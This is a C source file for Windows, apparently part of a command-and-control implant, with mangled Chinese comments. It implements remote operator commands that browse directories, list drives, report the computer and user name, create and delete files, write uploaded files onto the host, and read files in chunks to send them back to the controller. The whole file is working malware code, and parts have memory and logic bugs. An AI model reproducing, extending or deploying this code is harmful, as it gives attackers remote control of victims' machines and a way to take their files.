#define _TIMESPEC_DEFINED  // ��ֹ windows.h �ظ����� timespec
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "Command.h"
#include <iphlpapi.h>
#pragma warning(disable:4996)
#define PATH_MAX 4096
#define MAX_PATH_LENGTH 1048
#define MAX_TIME_STRING_LENGTH 50
extern unsigned char AESRandaeskey[16];
extern int Counter;

wchar_t* convertToWideChar(const unsigned char* input) {
    int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
    if (len == 0) {
        fprintf(stderr, "MultiByteToWideChar failed\n");
        return NULL;
    }

    wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (wideStr == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
        fprintf(stderr, "MultiByteToWideChar failed\n");
        free(wideStr);
        return NULL;
    }

    return wideStr;
}

unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
    if (!wideStr) return NULL;

    int utf8Len = wcstombs(NULL, wideStr, 0);
    if (utf8Len <= 0) return NULL;

    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len + 1);
    if (!utf8Str) return NULL;

    wcstombs((char*)utf8Str, wideStr, utf8Len);
    utf8Str[utf8Len] = '\0';

    return utf8Str;
}

unsigned char* listDirectory(unsigned char* dirPathy , size_t* dirPathStrlen) {
    
    setlocale(LC_ALL, "");
    wchar_t* path = convertToWideChar(dirPathy);
    struct _wfinddata_t file_info;
    intptr_t handle;
    wchar_t search_path[MAX_PATH_LENGTH];
    size_t len = wcslen(path);

    if (len > 0 && path[len - 1] == L'/') {
        path[len - 1] = L'\0';
    }

    swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);

    if ((handle = _wfindfirst(search_path, &file_info)) == -1L) {
        fprintf(stderr, "Unable to open directory");
        wcscpy(search_path, L"C:\\*");
        handle = _wfindfirst(search_path, &file_info);
    }

    wchar_t resultStr[PATH_MAX];
    resultStr[0] = L'\0';

    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"%s", search_path);
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L".");
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L"..");
    wchar_t timeString[MAX_TIME_STRING_LENGTH];
    do {
        if (wcscmp(file_info.name, L".") != 0 && wcscmp(file_info.name, L"..") != 0) {
            if (file_info.attrib & _A_SUBDIR) {
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", timeString,file_info.name);
            }
            else {
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nF\t%lld\t%s\t%s",file_info.size , timeString ,file_info.name);
               
            }
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);

    unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
    *dirPathStrlen = strlen(resultStrchar);

    return resultStrchar;
}

unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* lenn) {
    uint8_t pendingRequest[4];
    uint8_t dirPathLenBytes[4];

    unsigned char* pendingRequeststart = commandBuf;
    unsigned char* dirPathLenBytesstart = commandBuf + 4;
    memcpy(pendingRequest, pendingRequeststart, 4);
    memcpy(dirPathLenBytes, dirPathLenBytesstart, 4);
    uint32_t dirPathLen = bigEndianUint32(dirPathLenBytes);
    unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
    unsigned char* dirPathBytesstart = commandBuf + 8;

    memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
    dirPathBytes[dirPathLen] = '\0';
    
    unsigned char*  dirPathStr = str_replace_all(dirPathBytes, "*", "");
    
    unsigned char* dirPathStr11[] = {0x2e, 0x2f};

    if (*dirPathStr == *dirPathStr11) {
        char cwd[PATH_MAX];
        if (getcwd(cwd, sizeof(cwd)) == NULL) {
            fprintf(stderr, "getcwd failed\n");
            return NULL;
        }

        unsigned char* relativePath = ""; // ���·��
        char absolutePath[PATH_MAX];
        snprintf(absolutePath, sizeof(absolutePath), "%s/%s", cwd, relativePath);
        dirPathStr = absolutePath;
    }
    else
    {
        dirPathStr = str_replace_all(dirPathStr, "/", "\\");
    }
    size_t dirPathStrlen;
    
    unsigned char* result = listDirectory(dirPathStr,&dirPathStrlen);
    
    uint8_t* result8 = (uint8_t*)result;
    uint8_t* metaInfoBytes[] = { pendingRequest, result8 };
    size_t metaInfosizes[] = { 4,dirPathStrlen };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;

    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }

    int callbackType = 0;
    *lenn = metaInfoSize;

    return metaInfoconcatenated;
}

unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* Bufflen, int chunkNumber) {
    uint8_t filePathLenBytes[4];
    unsigned char* filePathLenstart = commandBuf;
    
    memcpy(filePathLenBytes, filePathLenstart, 4);

    uint32_t filePathLen = bigEndianUint32(filePathLenBytes);
    unsigned char* filePath = (unsigned char*)malloc(filePathLen);
    filePath[filePathLen] = '\0';

    unsigned char* filePathstart = commandBuf + 4;
    memcpy(filePath, filePathstart, filePathLen);

    size_t fileContenthlen = (size_t)commandBuflen - 4 - (size_t)filePathLen;
    unsigned char* fileContenth = (unsigned char*)malloc(fileContenthlen);
    fileContenth[fileContenthlen] = '\0';
    unsigned char* fileContenthstart = commandBuf + filePathLen +4;

    unsigned char* chunk = (unsigned char*)malloc(1024);

    if (!chunk) {
        fprintf(stderr, "Error allocating memory\n");
        return;
    }

    size_t bytesRead;
    size_t offset = 0;

    while (offset < (size_t)fileContenthlen) {
        size_t remaining = (size_t)fileContenthlen - offset;
        size_t chunkSize = remaining > 1024 ? 1024 : remaining;

        memcpy(chunk, fileContenthstart + offset, chunkSize);

        Upload(filePath, chunk, chunkSize, chunkNumber);

        offset += chunkSize;
        chunkNumber++;
    }

    unsigned char* Uploadstr = "success, the offset is: ";
    unsigned char offsetchar[20];      // ����ת�ַ���������
    sprintf(offsetchar, "%d", offset); // ������ת��Ϊ�ַ���
    unsigned char* result = (unsigned char*)malloc(strlen(offsetchar)+strlen(Uploadstr));
    result[strlen(offsetchar) + strlen(Uploadstr)]='\0';
    

    memcpy(result, Uploadstr,strlen(Uploadstr));
    memcpy(result + strlen(Uploadstr), offsetchar, strlen(offsetchar));
    *Bufflen = strlen(offsetchar) + strlen(Uploadstr);

    return result;
}

int Upload(const unsigned char* filePath, const unsigned char* fileContent, size_t contentSize, int isStart) {
    FILE* fp;
    const char* mode;
    
    if (isStart == 1) {
        // ����ļ����ڣ���Ҫ�û����ϴ�ǰ�ֶ�ɾ����
        mode = "wb"; // �Զ�����д��ģʽ���ļ�������ļ�������ض�����
    }
    else {
        mode = "ab"; // ��׷�Ӷ�����д��ģʽ���ļ�
    }

    fp = fopen(filePath, mode);
    if (fp == NULL) {
        perror("File open error");
        return -1;
    }

    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), contentSize, fp);
    if (bytesWritten != contentSize) {
        perror("File write error");
        fclose(fp);
        return -1;
    }

    fclose(fp);
    return (int)bytesWritten;
}

unsigned char* CmdDrives(unsigned char* commandBuf, size_t* Bufflen) {

    DWORD drives = GetLogicalDrives();
    unsigned char drives2[20];
    sprintf(drives2, "%d", drives);

    unsigned char* result = (unsigned char*)malloc(strlen(drives2));
    result[strlen(drives2)]='\0';
    memcpy(result, drives2, strlen(drives2));
    uint8_t command[4];
    memcpy(command, commandBuf,4);

    uint8_t* metaInfoBytes[] = { command, result };
    size_t metaInfosizes[] = { 4, strlen(result) };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;
    
    // �������� sizeof ����ֵ���ܺ�
    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }
    *Bufflen = metaInfoSize;

    return metaInfoconcatenated;
}

unsigned char* CmdPwd(unsigned char* commandBuf, size_t* Bufflen) {

    // ��ȡ�����������С������'\0'
    DWORD bufferSize = GetCurrentDirectoryA(0, NULL); 

    if (bufferSize == 0) {
        unsigned char* error = "Error Get Directory";
        *Bufflen = strlen(error);
        return error;
    }

    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize * sizeof(char));

    // result ������'\0'
    DWORD result = GetCurrentDirectoryA(bufferSize, lpcurrentPath);

    if (result == 0 || result > bufferSize) {
        free(lpcurrentPath);
        unsigned char* error = "Error Get Directory";
        *Bufflen = strlen(error);
        return error; 
    }

    // û��'\0'
    *Bufflen = result;
    return (unsigned char*)lpcurrentPath;
}

unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* Bufflen) {
    unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
    unsigned char* userName = (unsigned char*)malloc(UNLEN);

    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameA(computerName, &size)) {
        fprintf(stderr, "Error Get Computer Name\n");
    }

    size = UNLEN + 1;
    if (!GetUserNameA(userName, &size)) {
        fprintf(stderr, "Error Get User Name\n");
    }

    size_t total_len = strlen(computerName) + strlen(userName) + 2; // ������'\0'
    unsigned char* result = malloc(total_len);

    snprintf(result, total_len, "%s\\%s", computerName, userName);
    *Bufflen = total_len;

    return result;
}

unsigned char* CmdMkdir(unsigned char* cmdBuf,size_t* commandBuflen, size_t* Bufflen) {
    cmdBuf[*commandBuflen] = '\0';
    if (CreateDirectoryA((LPCSTR)cmdBuf, NULL) != 0) {
        fprintf(stderr, "Error creating directory");
        return NULL;
    }

    unsigned char* Mkdirstr = "Mkdir Success:";
    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + *commandBuflen);
    memcpy(result, Mkdirstr, strlen(Mkdirstr));
    memcpy(result + strlen(Mkdirstr), cmdBuf, *commandBuflen);
    
    *Bufflen = strlen(Mkdirstr) + *commandBuflen;

    return result;
}


unsigned char* CmdFileRemove(unsigned char* cmdBuf, size_t* commandBuflen, size_t* Bufflen) {
    cmdBuf[*commandBuflen] = '\0';
    DWORD attributes = GetFileAttributesA((LPCSTR)cmdBuf);

    // printf("Attributes: 0x%lX\n", attributes);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "Remove failed:Invalid path or file";
        *Bufflen = strlen(errorMsg);
        unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
        if (result) {
            memcpy(result, errorMsg, *Bufflen + 1);
        }

        return result;
    }

    int removeResult;
    // ɾ���ļ���Ŀ¼�����
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        removeResult = RemoveDirectoryA((LPCSTR)cmdBuf);
    }
    // �ļ�
    else {
        removeResult = DeleteFileA((LPCSTR)cmdBuf);
    }

    unsigned char* Removestr = removeResult == 0 ? "Remove Failed:" : "Remove Success:";
    size_t RemovestrLen = strlen(Removestr);

    *Bufflen = RemovestrLen + *commandBuflen;
    unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        *Bufflen = 0;
        return NULL;
    }

    memcpy(result, Removestr, RemovestrLen);
    memcpy(result + RemovestrLen, cmdBuf, *commandBuflen);
    result[*Bufflen] = '\0';

    return result;
}

struct ThreadArgs {
    unsigned char* buf;
    size_t* commandBuflen;
    size_t* Bufflen;
};

DWORD WINAPI myThreadFunction(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;
    LPCSTR lpFilePath = (LPCSTR)buf;
    // printf("%s\n", lpFilePath);
    off_t fileLenValue = 0;
    uint32_t fileLensValue = 0;
    off_t* fileLen = &fileLenValue;     
    uint32_t* fileLens = &fileLensValue; 

    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &fileInfo)) {
        LARGE_INTEGER largeFileSize;
        largeFileSize.LowPart = fileInfo.nFileSizeLow;
        largeFileSize.HighPart = fileInfo.nFileSizeHigh;
        *fileLen = largeFileSize.QuadPart; 
        // ������� 4GB ���ļ�
        if (largeFileSize.QuadPart > UINT32_MAX) {
            unsigned char* ErrorSizeStr = "[-] The downloaded file is larger than 4GB";
            DataProcess(ErrorSizeStr, strlen(ErrorSizeStr), 0);
            return 1;
        }
        *fileLens = (uint32_t)largeFileSize.QuadPart;
    }

    else {
        fprintf(stderr, "Failed to get file attributes: %lu\n", GetLastError());
        return 1;
    }

    // ���ݰ���ʽ: requestIdBytesStart(4Bytes) | fileLenBytes(4Bytes) | buf
    uint8_t fileLenBytes[4];
    PutUint32BigEndian(fileLenBytes, fileLens);
    uint32_t rand = (uint32_t)GenerateRandomInt(10000, 99999);
    uint8_t requestIdBytesStart[4];
    PutUint32BigEndian(requestIdBytesStart, rand);
    uint8_t* metaInfoBytes[] = { requestIdBytesStart, fileLenBytes, buf };
    size_t metaInfosizes[] = { 4, 4, *commandBuflen };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;

    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }

    DataProcess(metaInfoconcatenated, metaInfoSize, 2);

    HANDLE hFile = CreateFileA(buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }

    unsigned char* fileBuf = malloc(1024 * 1024); // ������ 1MB
    if (fileBuf == NULL) {
        fclose(hFile);
        return 1;
    }

    size_t metaInfoSizeToo = 0;
    DWORD bytesRead;
    // ���ݰ���ʽ: requestIdBytesStart(4Bytes) | fileBuf
    while (ReadFile(hFile, (LPVOID)fileBuf, 1024 * 1024, &bytesRead, NULL) && bytesRead > 0) {
        uint8_t* metaInfoBytesToo[] = { requestIdBytesStart, fileBuf };
        size_t metaInfosizesToo[] = { 4, bytesRead };
        size_t metaInfoBytesNumsToo = sizeof(metaInfoBytesToo) / sizeof(metaInfoBytesToo[0]); // ����
        uint8_t* metaInfoconcatenatedToo = CalcByte(metaInfoBytesToo, metaInfosizesToo, metaInfoBytesNumsToo); // �ϲ�
        metaInfoSizeToo = 4 + bytesRead;
       
        DataProcess(metaInfoconcatenatedToo, metaInfoSizeToo, 8);
        Sleep(50);
    }

    free(fileBuf);

    return 0;
}

unsigned char* CmdFileDownload(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen) {
    buf[*commandBuflen] = '\0';
    DWORD attributes = GetFileAttributesA((LPCSTR)buf);

    // printf("Attributes: 0x%lX\n", attributes);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "Remove failed:Invalid path or file";
        *Bufflen = strlen(errorMsg);
        unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
        if (result) {
            memcpy(result, errorMsg, *Bufflen + 1);
        }

        return result;
    }

    // Ŀ¼
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        fprintf(stderr, "Unable to download directory\n");
        return NULL;
    }

    struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
    if (args == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    args->buf = buf;
    args->commandBuflen = commandBuflen;

    HANDLE myThread = CreateThread(
        NULL,                       // Ĭ���̰߳�ȫ��
        0,                          // Ĭ�϶�ջ��С
        myThreadFunction,           // �̺߳���
        args,                       // ���ݸ��̺߳����Ĳ���
        0,                          // Ĭ�ϴ�����־
        NULL);                      // ���洢�߳�ID

    if (myThread == NULL) {
        fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
        return NULL;
    }

    WaitForSingleObject(myThread, INFINITE);
    CloseHandle(myThread);

    unsigned char* downloadStr = "[+] Already Download file ";
    unsigned char* result = (unsigned char*)malloc(strlen(downloadStr) + *commandBuflen);
    memcpy(result, downloadStr, strlen(downloadStr));
    memcpy(result + strlen(downloadStr), buf, *commandBuflen);
    *Bufflen = strlen(downloadStr) + *commandBuflen;

    return result;
}